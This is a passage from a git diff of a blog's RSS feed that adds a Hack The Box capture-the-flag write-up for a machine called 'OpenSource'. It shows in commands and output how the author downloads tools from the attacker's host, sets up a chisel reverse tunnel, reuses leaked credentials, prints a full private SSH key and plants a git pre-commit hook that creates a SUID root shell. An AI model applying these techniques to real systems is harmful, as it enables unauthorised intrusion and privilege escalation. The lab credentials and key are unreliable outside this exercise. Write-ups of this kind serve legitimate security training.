+</span></span><span style="display:flex;"><span>10.10.11.164 - - <span style="color:#f92672">[</span>06/Oct/2022 06:31:47<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /chisel_1.7.7_linux_amd64 HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>/app <span style="color:#75715e"># wget http://10.10.16.59:8000/chisel_1.7.7_linux_amd64</span>
+</span></span><span style="display:flex;"><span>Connecting to 10.10.16.59:8000 <span style="color:#f92672">(</span>10.10.16.59:8000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>saving to <span style="color:#e6db74">&#39;chisel_1.7.7_linux_amd64&#39;</span>
+</span></span><span style="display:flex;"><span>chisel_1.7.7_linux_a 100% |********************************| 7888k  0:00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;chisel_1.7.7_linux_amd64&#39;</span> saved
+</span></span></code></pre></div><p>On my attacking machine, I&rsquo;ll run a server instance of <a href="https://github.com/jpillora/chisel/releases"><em>chisel</em></a> that will listen on port 9001, then I&rsquo;ll connect to it from the victim machine and forward the connection of <em>http://172.17.0.1:3000/</em> accessible only from this machine to mine.</p>
+<ul>
+<li>On the attacker:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ /opt/chisel/chisel_1.7.7_linux_amd64 server -p <span style="color:#ae81ff">9001</span> --reverse
+</span></span><span style="display:flex;"><span>2022/10/06 06:44:50 server: Reverse tunnelling enabled
+</span></span><span style="display:flex;"><span>2022/10/06 06:44:50 server: Fingerprint kLnVUdsvKZMD+fJ8bH+jt0Hizup2oUVE54EiS6kzxzs<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>2022/10/06 06:44:50 server: Listening on http://0.0.0.0:9001
+</span></span></code></pre></div></li>
+<li>On the victim:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>/app <span style="color:#75715e"># ./chisel_1.7.7_linux_amd64 client 10.10.16.59:9001 R:127.0.0.1:3000:172.17.0.1:3000</span>
+</span></span><span style="display:flex;"><span>2022/10/06 03:51:01 client: Connecting to ws://10.10.16.59:9001
+</span></span><span style="display:flex;"><span>2022/10/06 03:51:02 client: Connected <span style="color:#f92672">(</span>Latency 81.014967ms<span style="color:#f92672">)</span>
+</span></span></code></pre></div></li>
+</ul>
+<p>I can now access <a href="https://gitea.io/en-us/"><em>Gitea</em></a> from my attacking machine using firefox on <em>http://127.0.0.1:3000/</em></p>
+<p><img src="accessing-gitea.png" alt="Accessing Gitea From My Machine"></p>
+<p>Now I&rsquo;ll use the previous credentials <em>dev01:Soulless_Developer#2022</em> to try to login to this instance.</p>
+<p><img src="discovering-home-dir-backup.png" alt="Loging In To Gitea"></p>
+<p>It appears that this user is trying to backup his home directory, so we can take advantage of this and read his <em>.ssh/id_rsa</em> key file.</p>
+<p><img src="reading-ssh-key.png" alt="Reading SSH Key"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ chmod <span style="color:#ae81ff">600</span> dev01_id_rsa 
+</span></span><span style="display:flex;"><span>$ cat dev01_id_rsa 
+</span></span><span style="display:flex;"><span>-----BEGIN RSA PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>MIIJKQIBAAKCAgEAqdAaA6cYgiwKTg/6SENSbTBgvQWS6UKZdjrTGzmGSGZKoZ0l
+</span></span><span style="display:flex;"><span>xfb28RAiN7+yfT43HdnsDNJPyo3U1YRqnC83JUJcZ9eImcdtX4fFIEfZ8OUouu6R
+</span></span><span style="display:flex;"><span>u2TPqjGvyVZDj3OLRMmNTR/OUmzQjpNIGyrIjDdvm1/Hkky/CfyXUucFnshJr/BL
+</span></span><span style="display:flex;"><span>7FU4L6ihII7zNEjaM1/d7xJ/0M88NhS1X4szT6txiB6oBMQGGolDlDJXqA0BN6cF
+</span></span><span style="display:flex;"><span>wEza2LLTiogLkCpST2orKIMGZvr4VS/xw6v5CDlyNaMGpvlo+88ZdvNiKLnkYrkE
+</span></span><span style="display:flex;"><span>WM+N+2c1V1fbWxBp2ImEhAvvgANx6AsNZxZFuupHW953npuL47RSn5RTsFXOaKiU
+</span></span><span style="display:flex;"><span>rzJZvoIc7h/9Jh0Er8QLcWvMRV+5hjQLZXTcey2dn7S0OQnO2n3vb5FWtJeWVVaN
+</span></span><span style="display:flex;"><span>O/cZWqNApc2n65HSdX+JY+wznGU6oh9iUpcXplRWNH321s9WKVII2Ne2xHEmE/ok
+</span></span><span style="display:flex;"><span>Nk+ZgGMFvD09RIB62t5YWF+yitMDx2E+XSg7bob3EO61zOlvjtY2cgvO6kmn1E5a
+</span></span><span style="display:flex;"><span>FX5S6sjxxncq4cj1NpWQRjxzu63SlP5i+3N3QPAH2UsVTVcbsWqr9jbl/5h4enkN
+</span></span><span style="display:flex;"><span>W0xav8MWtbCnAsmhuBzsLML0+ootNpbagxSmIiPPV1p/oHLRsRnJ4jaqoBECAwEA
+</span></span><span style="display:flex;"><span>AQKCAgEAkXmFz7tGc73m1hk6AM4rvv7C4Sv1P3+emHqsf5Y4Q63eIbXOtllsE/gO
+</span></span><span style="display:flex;"><span>WFQRRNoXvasDXbiOQqhevMxDyKlqRLElGJC8pYEDYeOeLJlhS84Fpp7amf8zKEqI
+</span></span><span style="display:flex;"><span>naMZHbuOg89nDbtBtbsisAHcs+ljBTw4kJLtFZhJ0PRjbtIbLnvHJMJnSH95Mtrz
+</span></span><span style="display:flex;"><span>rkDIePIwe/KU3kqq1Oe0XWBAQSmvO4FUMZiRuAN2dyVAj6TRE1aQxGyBsMwmb55D
+</span></span><span style="display:flex;"><span>O1pxDYA0I3SApKQax/4Y4GHCbC7XmQQdo3WWLVVdattwpUa7wMf/r9NwteSZbdZt
+</span></span><span style="display:flex;"><span>C/ZoJQtaofatX7IZ60EIRBGz2axq7t+IEDwSAQp3MyvNVK4h83GifVb/C9+G3XbM
+</span></span><span style="display:flex;"><span>BmUKlFq/g20D225vnORXXsPVdKzbijSkvupLZpsHyygFIj8mdg2Lj4UZFDtqvNSr
+</span></span><span style="display:flex;"><span>ajlFENjzJ2mXKvRXvpcJ6jDKK+ne8AwvbLHGgB0lZ8WrkpvKU6C/ird2jEUzUYX7
+</span></span><span style="display:flex;"><span>rw/JH7EjyjUF/bBlw1pkJxB1HkmzzhgmwIAMvnX16FGfl7b3maZcvwrfahbK++Dd
+</span></span><span style="display:flex;"><span>bD64rF+ct0knQQw6eeXwDbKSRuBPa5YHPHfLiaRknU2g++mhukE4fqcdisb2OY6s
+</span></span><span style="display:flex;"><span>futu9PMHBpyHWOzO4rJ3qX5mpexlbUgqeQHvsrAJRISAXi0md0ECggEBAOG4pqAP
+</span></span><span style="display:flex;"><span>IbL0RgydFHwzj1aJ/+L3Von1jKipr6Qlj/umynfUSIymHhhikac7awCqbibOkT4h
+</span></span><span style="display:flex;"><span>XJkJGiwjAe4AI6/LUOLLUICZ+B6vo+UHP4ZrNjEK3BgP0JC4DJ5X/S2JUfxSyOK+
+</span></span><span style="display:flex;"><span>Hh/CwZ9/6/8PtLhe7J+s7RYuketMQDl3MOp+MUdf+CyizXgYxdDqBOo67t4DxNqs
+</span></span><span style="display:flex;"><span>ttnakRXotUkFAnWWpCKD+RjkBkROEssQlzrMquA2XmBAlvis+yHfXaFj3j0coKAa
+</span></span><span style="display:flex;"><span>Ent6NIs/B8a/VRMiYK5dCgIDVI9p+Q7EmBL3HPJ+29A6Eg3OG50FwfPfcvxtxjYw
+</span></span><span style="display:flex;"><span>Fq338ppt+Co0wd8CggEBAMCXiWD6jrnKVJz7gVbDip64aa1WRlo+auk8+mlhSHtN
+</span></span><span style="display:flex;"><span>j+IISKtyRF6qeZHBDoGLm5SQzzcg5p/7WFvwISlRN3GrzlD92LFgj2NVjdDGRVUk
+</span></span><span style="display:flex;"><span>kIVKRh3P9Q4tzewxFoGnmYcSaJwVHFN7KVfWEvfkM1iucUxOj1qKkD1yLyP7jhqa
+</span></span><span style="display:flex;"><span>jxEYrr4+j1HWWmb7Mvep3X+1ZES1jyd9zJ4yji9+wkQGOGFkfzjoRyws3vPLmEmv
+</span></span><span style="display:flex;"><span>VeniuSclLlX3xL9CWfXeOEl8UWd2FHvZN8YeK06s4tQwPM/iy0BE4sDQyae7BO6R
+</span></span><span style="display:flex;"><span>idvvvD8UInqlc+F2n1X7UFKuYizOiDz0D2pAsJI9PA8CggEBAI/jNoyXuMKsBq9p
+</span></span><span style="display:flex;"><span>vrJB5+ChjbXwN4EwP18Q9D8uFq+zriNe9nR6PHsM8o5pSReejSM90MaLW8zOSZnT
+</span></span><span style="display:flex;"><span>IxrFifo5IDHCq2mfPNTK4C5SRYN5eo0ewBiylCB8wsZ5jpHllJbFavtneCqE6wqy
+</span></span><span style="display:flex;"><span>8AyixXA2Sp6rDGN0gl49OD+ppEwG74DxQ3GowlQJbqhzVXi+4qAyRN2k9dbABnax
+</span></span><span style="display:flex;"><span>5kZK5DtzMOQzvqnISdpm7oH17IF2EINnBRhUdCjHlDsOeVA1KmlIg3grxpZh23bc
+</span></span><span style="display:flex;"><span>Uie2thPBeWINOyD3YIMfab2pQsvsLM7EYXlGW1XjiiS5k97TFSinDZBjbUGu6j7Z
+</span></span><span style="display:flex;"><span>VTYKdX8CggEAUsAJsBiYQK314ymRbjVAl2gHSAoc2mOdTi/8LFE3cntmCimjB79m
+</span></span><span style="display:flex;"><span>LwKyj3TTBch1hcUes8I4NZ8qXP51USprVzUJxfT8KWKi2XyGHaFDYwz957d9Hwwe
+</span></span><span style="display:flex;"><span>cAQwSX7h+72GkunO9tl/PUNbBTmfFtH/WehCGBZdM/r7dNtd8+j/KuEj/aWMV4PL
+</span></span><span style="display:flex;"><span>0s72Mu9V++IJoPjQZ1FXfBFqXMK+Ixwk3lOJ4BbtLwdmpU12Umw1N9vVX1QiV/Z6
+</span></span><span style="display:flex;"><span>zUdTSxZ4TtM3fiOjWn/61ygC9eY6l2hjYeaECpKY4Dl48H4FV0NdICB6inycdsHw
+</span></span><span style="display:flex;"><span>+p+ihcqRNcFwxsXUuwnWsdHv2aiH9Z3H8wKCAQAlbliq7YW45VyYjg5LENGmJ8f0
+</span></span><span style="display:flex;"><span>gEUu7u8Im+rY+yfW6LqItUgCs1zIaKvXkRhOd7suREmKX1/HH3GztAbmYsURwIf/
+</span></span><span style="display:flex;"><span>nf4P67EmSRl46EK6ynZ8oHW5bIUVoiVV9SPOZv+hxwZ5LQNK3o7tuRyA6EYgEQll
+</span></span><span style="display:flex;"><span>o5tZ7zb7XTokw+6uF+mQriJqJYjhfJ2oXLjpufS+id3uYsLKnAXX06y4lWqaz72M
+</span></span><span style="display:flex;"><span>NfYDE7uwRhS1PwQyrMbaurAoI1Dq5n5nl6opIVdc7VlFPfoSjzixpWiVLZFoEbFB
+</span></span><span style="display:flex;"><span>AE77E1AeujKjRkXLQUO3z0E9fnrOl5dXeh2aJp1f+1Wq2Klti3LTLFkKY4og
+</span></span><span style="display:flex;"><span>-----END RSA PRIVATE KEY-----
+</span></span></code></pre></div><p>Using SSH I can login the machine and get the user flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ssh -i dev01_id_rsa dev01@opensource.htb
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 18.04.5 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-176-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System information as of Thu Oct  <span style="color:#ae81ff">6</span> 05:38:28 UTC <span style="color:#ae81ff">2022</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System load:  0.01              Processes:              <span style="color:#ae81ff">215</span>
+</span></span><span style="display:flex;"><span>  Usage of /:   75.6% of 3.48GB   Users logged in:        <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>  Memory usage: 22%               IP address <span style="color:#66d9ef">for</span> eth0:    10.10.11.164
+</span></span><span style="display:flex;"><span>  Swap usage:   0%                IP address <span style="color:#66d9ef">for</span> docker0: 172.17.0.1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">16</span> updates can be applied immediately.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">9</span> of these updates are standard security updates.
+</span></span><span style="display:flex;"><span>To see these additional updates run: apt list --upgradable
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Last login: Mon May <span style="color:#ae81ff">16</span> 13:13:33 <span style="color:#ae81ff">2022</span> from 10.10.14.23
+</span></span><span style="display:flex;"><span>dev01@opensource:~$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dev01<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dev01<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dev01<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>dev01@opensource:~$ cat user.txt 
+</span></span><span style="display:flex;"><span>6c4**************************c7c
+</span></span><span style="display:flex;"><span>dev01@opensource:~$ 
+</span></span></code></pre></div><h2 id="post-enumeration">Post Enumeration</h2>
+<p>I&rsquo;ll use <a href="https://github.com/DominicBreuker/pspy#download"><em>pspy</em></a> to snoop on running processes and see if I can get anything about root.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dev01@opensource:/tmp$ wget http://10.10.16.59:8000/pspy64 
+</span></span><span style="display:flex;"><span>--2022-10-06 07:52:21--  http://10.10.16.59:8000/pspy64
+</span></span><span style="display:flex;"><span>Connecting to 10.10.16.59:8000... connected.
+</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Length: <span style="color:#ae81ff">3078592</span> <span style="color:#f92672">(</span>2.9M<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>application/octet-stream<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Saving to: ‘pspy64’
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pspy64                                               100%<span style="color:#f92672">[======================================================================================================================</span>&gt;<span style="color:#f92672">]</span>   2.94M   117KB/s    in 39s     
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2022-10-06 07:53:02 <span style="color:#f92672">(</span>76.5 KB/s<span style="color:#f92672">)</span> - ‘pspy64’ saved <span style="color:#f92672">[</span>3078592/3078592<span style="color:#f92672">]</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dev01@opensource:/tmp$ chmod +x pspy64
+</span></span><span style="display:flex;"><span>dev01@opensource:/tmp$ ./pspy64
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16029</span>  | /bin/bash /usr/local/bin/git-sync 
+</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16030</span>  | /bin/bash /root/meta/app/clean.sh 
+</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16031</span>  | /bin/bash /root/meta/app/clean.sh 
+</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16034</span>  | /bin/bash /root/meta/app/clean.sh 
+</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16033</span>  | /bin/bash /root/meta/app/clean.sh 
+</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16032</span>  | /bin/bash /usr/local/bin/git-sync 
+</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16035</span>  | git add . 
+</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16037</span>  | git push origin main 
+</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16038</span>  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>It appears that root is executing <em>/usr/local/bin/git-sync</em> which is a script that contains <em>git</em> commands.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dev01@opensource:/tmp$ cat /usr/local/bin/git-sync
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cd /home/dev01/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ! git status --porcelain; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;No changes&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    day<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>date +<span style="color:#e6db74">&#39;%Y-%m-%d&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;Changes detected, pushing..&#34;</span>
+</span></span><span style="display:flex;"><span>    git add .
+</span></span><span style="display:flex;"><span>    git commit -m <span style="color:#e6db74">&#34;Backup for </span><span style="color:#e6db74">${</span>day<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    git push origin main
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span></code></pre></div><h3 id="getting-root">Getting root</h3>
+<p>The overall idea about escalating privileges is about root <em>commiting changes</em> by navigating to the <em>/home/dev01</em> directory and then commiting these changes. So I can <em>add a hook</em> in the <em>.git/hooks/</em> directory which is a script that will get executed by any user running a specific git command.</p>
+<p>There are many types of hooks, for example a <em>pre-commit</em> hook will run before the user commits a change, on the other hand, a <em>post-commit</em> hook will run after the commit takes place, and there are others depending on the actions taken like push &hellip;</p>
+<p>So, I&rsquo;ll add a new file in <em>.git/hooks/</em> called <em>pre-commit</em> that contains a reverse shell and make it executable and this will run whenever any user makes a commit in this repo/directory, and since root is making commits when any change is made to the directory, I&rsquo;ll also create a new file.</p>
+<p>To get root:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>touch ~/dummyfile
+</span></span><span style="display:flex;"><span>touch ~/.git/hooks/pre-commit;
+</span></span><span style="display:flex;"><span>chmod +x ~/.git/hooks/pre-commit;
+</span></span><span style="display:flex;"><span>echo -e <span style="color:#e6db74">&#39;#!/bin/bash\ncp /bin/bash /tmp/newbash;\nchmod u+s /tmp/newbash&#39;</span> &gt; ~/.git/hooks/pre-commit
+</span></span></code></pre></div><p>After waiting some time, a new <em>SUID</em> bash file has been created in <em>/tmp</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dev01@opensource:~$ ls -l /tmp/newbash 
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1113504</span> Oct  <span style="color:#ae81ff">6</span> 09:30 /tmp/newbash
+</span></span><span style="display:flex;"><span>dev01@opensource:~$ /tmp/newbash -p
+</span></span><span style="display:flex;"><span>newbash-4.4# id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dev01<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dev01<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dev01<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>newbash-4.4# cat /root/root.txt
+</span></span><span style="display:flex;"><span>288**************************093
+</span></span></code></pre></div>]]></content>
+        </item>
         
         <item>
             <title>Scrambled</title>
@@ -14,8 +668,7 @@
             <pubDate>Tue, 27 Sep 2022 22:16:35 +0300</pubDate>
             
             <guid>https://mostxeon.github.io/posts/scrambled/</guid>
-            <description>Initial Recon Nmap Starting with a full tcp port scan we got the below results
-$ nmap -vvv -p- -A -oN nmap/tcp-all.txt 10.10.11.168 Nmap scan report for 10.10.11.168 Host is up, received syn-ack (0.084s latency). Scanned at 2022-09-20 03:50:10 EEST for 512s Not shown: 65513 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack Simple DNS Plus 80/tcp open http syn-ack Microsoft IIS httpd 10.0 |_http-title: Scramble Corp Intranet |_http-server-header: Microsoft-IIS/10.</description>
+            <description>false</description>
             <content type="html"><![CDATA[<h2 id="initial-recon">Initial Recon</h2>
 <h3 id="nmap">Nmap</h3>
 <p>Starting with a full tcp port scan we got the below results</p>
